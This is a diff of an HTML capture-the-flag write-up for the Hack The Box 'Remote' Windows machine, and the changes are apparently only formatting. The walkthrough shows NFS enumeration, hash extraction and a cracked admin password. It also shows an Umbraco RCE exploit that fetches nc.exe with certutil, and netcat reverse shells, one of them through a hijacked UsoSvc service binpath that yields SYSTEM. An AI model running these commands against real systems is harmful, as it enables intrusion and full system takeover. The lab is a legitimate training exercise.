@@ -93,8 +93,8 @@
 <p>This is an <strong>easy</strong> Windows box by <strong>mrb3n</strong>. For initial foothold we need to find and crack creds found in NFS and use them in an exploit so we can get RCE. After that we need PowerUp.ps1 powershell script to exploit a Windows Service so we can elevate privileges to nt authority\system. If you have any questions you can find me on Twitter @ajdintrejic.</p>
 <h1 id="reconnaissance">Reconnaissance</h1>
 <p>Let’s do a quick nmap scan.</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">nmap -sC -sV -O -oA nmap/initial 10.10.10.180
-</code></pre></div><p>Quick explanation:</p>
+<pre><code>nmap -sC -sV -O -oA nmap/initial 10.10.10.180
+</code></pre><p>Quick explanation:</p>
 <ul>
 <li>-sC: run default script scan</li>
 <li>-sV: probe open ports to determine service/version info</li>
@@ -102,7 +102,7 @@
 <li>oA: output OS detection, version detection, script scanning, and traceroute</li>
 </ul>
 <p>Results:</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">## nmapNmap scan report for 10.10.10.180 (10.10.10.180)
+<pre><code>## nmapNmap scan report for 10.10.10.180 (10.10.10.180)
 Host is up (1.0s latency).
 Not shown: 993 closed ports
 PORT     STATE SERVICE       VERSION
@@ -151,7 +151,7 @@ Service Info: OS: Windows; CPE: cpe:/o:microsoft:windowsHost script results:
 |   date: 2020-07-13T14:30:50
 |_  start_date: N/AOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 Nmap done: 1 IP address (1 host up) scanned in 635.59 seconds
-</code></pre></div><p>A quick look at the ports:</p>
+</code></pre><p>A quick look at the ports:</p>
 <ul>
 <li>port 21: a FTP port</li>
 <li>port 80: http server running on Microsoft Server</li>
@@ -182,25 +182,25 @@ root@mylo:~# showmount -h
 root@mylo:~# showmount -e %ipaddrs</p>
 </blockquote>
 <p>Connecting without an username and password is not possible on this box, so I tried mounting <strong>nfs</strong>.</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">kali@kali:~/htb/remote$ sudo mount -t nfs 10.10.10.180:/site_backups /home/kali/htb/remote/nfs
+<pre><code>kali@kali:~/htb/remote$ sudo mount -t nfs 10.10.10.180:/site_backups /home/kali/htb/remote/nfs
 [sudo] password for kali: 
 kali@kali:~/htb/remote$ cd nfs
 kali@kali:~/htb/remote/nfs$ ls
 App_Browsers  App_Data  App_Plugins  aspnet_client  bin  Config  css  default.aspx  Global.asax  Media  scripts  Umbraco  Umbraco_Client  Views  Web.config
-</code></pre></div><p>Boom, we got some info, after enumerating I found a file called <code>Umbraco.sdf</code> which unfortunately can’t be opened on Linux, I tried converting it to other types of formats with some online tools but none of them worked. But here comes the knowledge of other CTFs into play. We can search for strings in the file with an Unix tool called strings. The output is kinda big so I piped it to less.</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">strings Umbraco.sdf | less[...]
-Administrator admin b8be16afba8c314ad33d812f22a04991b90e2aaa {&#34;hashAlgorithm&#34;:&#34;SHA1&#34;} en-US f8512f97-cab1-4a4b-a49f-0a2054c47a1d
-admin admin@htb.local b8be16afba8c314ad33d812f22a04991b90e2aaa {&#34;hashAlgorithm&#34;:&#34;SHA1&#34;} admin@htb.local en-US feb1a998-d3bf-406a-b30b-e269d7abdf50
-admin admin@htb.local b8be16afba8c314ad33d812f22a04991b90e2aaa {&#34;hashAlgorithm&#34;:&#34;SHA1&#34;} admin@htb.local en-US82756c26-4321-4d27-b429-1b5c7c4f882f
-smith smith@htb.local jxDUCcruzN8rSRlqnfmvqw==AIKYyl6Fyy29KA3htB/ERiyJUAdpTtFeTpnIk9CiHts= {&#34;hashAlgorithm&#34;:&#34;HMACSHA256&#34;} smith@htb.local en-US 7e39df83-5e64-4b93-9702-ae257a9b9749-a054-27463ae58b8e
-ssmith smith@htb.local jxDUCcruzN8rSRlqnfmvqw==AIKYyl6Fyy29KA3htB/ERiyJUAdpTtFeTpnIk9CiHts= {&#34;hashAlgorithm&#34;:&#34;HMACSHA256&#34;} smith@htb.local en-US 7e39df83-5e64-4b93-9702-ae257a9b9749
-ssmith ssmith@htb.local 8+xXICbPe7m5NQ22HfcGlg==RF9OLinww9rd2PmaKUpLteR6vesD2MtFaBKe1zL5SXA= {&#34;hashAlgorithm&#34;:&#34;HMACSHA256&#34;} ssmith@htb.local en-US3628acfb-a62c-4ab0-93f7-5ee9724c8d32
+</code></pre><p>Boom, we got some info, after enumerating I found a file called <code>Umbraco.sdf</code> which unfortunately can’t be opened on Linux, I tried converting it to other types of formats with some online tools but none of them worked. But here comes the knowledge of other CTFs into play. We can search for strings in the file with an Unix tool called strings. The output is kinda big so I piped it to less.</p>
+<pre><code>strings Umbraco.sdf | less[...]
+Administrator admin b8be16afba8c314ad33d812f22a04991b90e2aaa {&quot;hashAlgorithm&quot;:&quot;SHA1&quot;} en-US f8512f97-cab1-4a4b-a49f-0a2054c47a1d
+admin admin@htb.local b8be16afba8c314ad33d812f22a04991b90e2aaa {&quot;hashAlgorithm&quot;:&quot;SHA1&quot;} admin@htb.local en-US feb1a998-d3bf-406a-b30b-e269d7abdf50
+admin admin@htb.local b8be16afba8c314ad33d812f22a04991b90e2aaa {&quot;hashAlgorithm&quot;:&quot;SHA1&quot;} admin@htb.local en-US82756c26-4321-4d27-b429-1b5c7c4f882f
+smith smith@htb.local jxDUCcruzN8rSRlqnfmvqw==AIKYyl6Fyy29KA3htB/ERiyJUAdpTtFeTpnIk9CiHts= {&quot;hashAlgorithm&quot;:&quot;HMACSHA256&quot;} smith@htb.local en-US 7e39df83-5e64-4b93-9702-ae257a9b9749-a054-27463ae58b8e
+ssmith smith@htb.local jxDUCcruzN8rSRlqnfmvqw==AIKYyl6Fyy29KA3htB/ERiyJUAdpTtFeTpnIk9CiHts= {&quot;hashAlgorithm&quot;:&quot;HMACSHA256&quot;} smith@htb.local en-US 7e39df83-5e64-4b93-9702-ae257a9b9749
+ssmith ssmith@htb.local 8+xXICbPe7m5NQ22HfcGlg==RF9OLinww9rd2PmaKUpLteR6vesD2MtFaBKe1zL5SXA= {&quot;hashAlgorithm&quot;:&quot;HMACSHA256&quot;} ssmith@htb.local en-US3628acfb-a62c-4ab0-93f7-5ee9724c8d32
 [...]
-</code></pre></div><p>This could have also been found with <code>strings Umbraco.sdf | grep -i hash</code>, and you could have replaced <code>hash</code> with something like <code>password</code>, <code>sha</code>, <code>admin</code>, etc.</p>
+</code></pre><p>This could have also been found with <code>strings Umbraco.sdf | grep -i hash</code>, and you could have replaced <code>hash</code> with something like <code>password</code>, <code>sha</code>, <code>admin</code>, etc.</p>
 <p>The other hashes I coudn’t crack but I cracked the admin one.</p>
 <p><img src="/htb/remote/4.png" alt=""></p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">admin:baconandcheese
-</code></pre></div><p>Now we got the creds, let’s try to login.</p>
+<pre><code>admin:baconandcheese
+</code></pre><p>Now we got the creds, let’s try to login.</p>
 <p><img src="/images/htb/remote/5.png" alt=""></p>
 <p>Inside of this CMS we can’t do anything except run that exploit I found before: Umraco Reverse Code Execution.</p>
 <h2 id="getting-a-reverse-shell">Getting a reverse shell<a class="anchor" href="#getting-a-reverse-shell">#</a></h2>
@@ -208,43 +208,43 @@ ssmith ssmith@htb.local 8+xXICbPe7m5NQ22HfcGlg==RF9OLinww9rd2PmaKUpLteR6vesD2MtF
 <ol>
 <li>Start a local python server for transfering nc.exe:</li>
 </ol>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">kali@kali:~/Downloads/netcat-1.11$ sudo python3 -m http.server 101
+<pre><code>kali@kali:~/Downloads/netcat-1.11$ sudo python3 -m http.server 101
 [sudo] password for kali: 
 Serving HTTP on 0.0.0.0 port 101 (http://0.0.0.0:101/) ...
-10.10.10.180 - - [14/Jul/2020 12:40:15] &#34;GET /nc.exe HTTP/1.1&#34; 200 -
-10.10.10.180 - - [14/Jul/2020 12:40:15] &#34;GET /nc.exe HTTP/1.1&#34; 200 -
-</code></pre></div><ol start="2">
+10.10.10.180 - - [14/Jul/2020 12:40:15] &quot;GET /nc.exe HTTP/1.1&quot; 200 -
+10.10.10.180 - - [14/Jul/2020 12:40:15] &quot;GET /nc.exe HTTP/1.1&quot; 200 -
+</code></pre><ol start="2">
 <li>Grab it from the box using the exploit:</li>
 </ol>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">kali@kali:~/htb/remote$ python3 exploit.py -u admin@htb.local -p baconandcheese -i &#39;http://10.10.10.180/&#39; -c powershell.exe -a &#39;-NoProfile -Command certutil -urlcache -split -f http://10.10.14.243:101/nc.exe c:/windows/temp/nc.exe&#39;
+<pre><code>kali@kali:~/htb/remote$ python3 exploit.py -u admin@htb.local -p baconandcheese -i 'http://10.10.10.180/' -c powershell.exe -a '-NoProfile -Command certutil -urlcache -split -f http://10.10.14.243:101/nc.exe c:/windows/temp/nc.exe'
 ****  Online  ****
   0000  ...
   8eb0
 CertUtil: -URLCache command completed successfully.
-</code></pre></div><ol start="3">
+</code></pre><ol start="3">
 <li>Start a reverse shell listener on your local machine:</li>
 </ol>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">kali@kali:~/htb/remote$ sudo nc -lvnp 102
+<pre><code>kali@kali:~/htb/remote$ sudo nc -lvnp 102
 [sudo] password for kali: 
 listening on [any] 102 ...
-</code></pre></div><ol start="4">
+</code></pre><ol start="4">
 <li>Execute nc to connect back to you</li>
 </ol>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">kali@kali:~/htb/remote$ python3 exploit.py -u admin@htb.local -p baconandcheese -i &#39;http://10.10.10.180/&#39; -c powershell.exe -a &#39;-NoProfile -Command c:/windows/temp/nc.exe 10.10.14.243 102 -e cmd.exe&#39;
-</code></pre></div><p>After that we should gain a connection on our reverse shell listener:</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">kali@kali:~/htb/remote$ sudo nc -lvnp 102
+<pre><code>kali@kali:~/htb/remote$ python3 exploit.py -u admin@htb.local -p baconandcheese -i 'http://10.10.10.180/' -c powershell.exe -a '-NoProfile -Command c:/windows/temp/nc.exe 10.10.14.243 102 -e cmd.exe'
+</code></pre><p>After that we should gain a connection on our reverse shell listener:</p>
+<pre><code>kali@kali:~/htb/remote$ sudo nc -lvnp 102
 [sudo] password for kali: 
 listening on [any] 102 ...
 connect to [10.10.14.243] from (UNKNOWN) [10.10.10.180] 49744
 Microsoft Windows [Version 10.0.17763.107]
 (c) 2018 Microsoft Corporation. All rights reserved.C:\windows\system32\inetsrv&gt;
-</code></pre></div><p><img src="/images/htb/remote/1.gif" alt=""></p>
+</code></pre><p><img src="/images/htb/remote/1.gif" alt=""></p>
 <p>And this is how I got user flag.</p>
 <hr>
 <h1 id="getting-nt-authoritysystem-root">Getting nt authority\system (root)</h1>
 <h2 id="privilege-escalation">Privilege escalation<a class="anchor" href="#privilege-escalation">#</a></h2>
 <p>I transfered winPEAS.exe on the machine to <code>C:\Windows\Temp</code>. When I ran it, it found multiple exploits.</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">Windows vulns search powered by Watson(https://github.com/rasta-mouse/Watson)
+<pre><code>Windows vulns search powered by Watson(https://github.com/rasta-mouse/Watson)
     OS Build Number: 17763
        [!] CVE-2019-0836 : VULNERABLE
         [&gt;] https://exploit-db.com/exploits/46718
@@ -278,24 +278,24 @@ Microsoft Windows [Version 10.0.17763.107]
 us/newsroom-and-events/blogs/2019/november/cve-2019-1405-and-cve-2019-1322-elevation-to-system-via-the-upnp-device-host-service-and-the-update-orchestrator-service/
 
     Finished. Found 9 potential vulnerabilities.
-</code></pre></div><p><img src="/images/htb/remote/2.gif" alt=""></p>
+</code></pre><p><img src="/images/htb/remote/2.gif" alt=""></p>
 <p>I looked at all of them and then, as I wasn’t familiar with Windows, I had no idea what to do next. There were some mentions in these about some services being vulnerable. Luckly I found this PowerUp.ps1 powershell script which can escalate privileges as noted below.</p>
 <blockquote>
 <p>PowerUp is the result of wanting a clean way to audit client systems for common Windows privilege escalation vectors. It utilizes various service abuse checks, .dll hijacking opportunities, registry checks, and more to enumerate common ways that you might be able to elevate on a target system.</p>
 </blockquote>
 <p>So I transfered it to the server, entered powershell and imported the script:</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">PS C:\windows\temp&gt; Import-Module c:\windows\temp\PowerUp.ps1
+<pre><code>PS C:\windows\temp&gt; Import-Module c:\windows\temp\PowerUp.ps1
 Import-Module c:\windows\temp\PowerUp.ps1
 PS C:\windows\temp&gt;
-</code></pre></div><p>So this script/service exploit allows us to run a command as nt authority/system so I just started another nc listener on my machine and executed nc.exe on this box with elevated privileges.</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">PS C:\windows\temp&gt; sc.exe stop UsoSvc
+</code></pre><p>So this script/service exploit allows us to run a command as nt authority/system so I just started another nc listener on my machine and executed nc.exe on this box with elevated privileges.</p>
+<pre><code>PS C:\windows\temp&gt; sc.exe stop UsoSvc
 sc.exe stop UsoSvc
 [SC] ControlService FAILED 1062:
 
 The service has not been started.
 
-PS C:\windows\temp&gt; sc.exe config UsoSvc binpath= &#34;c:\windows\temp\nc.exe 10.10.14.243 4444 -e cmd.exe&#34;           
-sc.exe config UsoSvc binpath= &#34;c:\windows\temp\nc.exe 10.10.14.243 4444 -e cmd.exe&#34;
+PS C:\windows\temp&gt; sc.exe config UsoSvc binpath= &quot;c:\windows\temp\nc.exe 10.10.14.243 4444 -e cmd.exe&quot;           
+sc.exe config UsoSvc binpath= &quot;c:\windows\temp\nc.exe 10.10.14.243 4444 -e cmd.exe&quot;
 [SC] ChangeServiceConfig SUCCESS
 PS C:\windows\temp&gt; sc.exe qc usosvc
 sc.exe qc usosvc
@@ -318,8 +318,8 @@ sc.exe start UsoSvc
 The service did not respond to the start or control request in a timely fashion.
 
 PS C:\windows\temp&gt;
-</code></pre></div><p>and on my reverse shell listener:</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">kali@kali:~/htb/remote$ sudo nc -lvnp 4444
+</code></pre><p>and on my reverse shell listener:</p>
+<pre><code>kali@kali:~/htb/remote$ sudo nc -lvnp 4444
 [sudo] password for kali: 
 listening on [any] 4444 ...
 connect to [10.10.14.243] from (UNKNOWN) [10.10.10.180] 49781
@@ -331,7 +331,7 @@ whoami
 nt authority\system
 
 C:\Windows\system32&gt;
-</code></pre></div><hr>
+</code></pre><hr>
 <h1 id="lessons-learned">Lessons learned</h1>
 <p>(Some of this might be n00b knowledge but this was my first Windows box)</p>
 <ul>
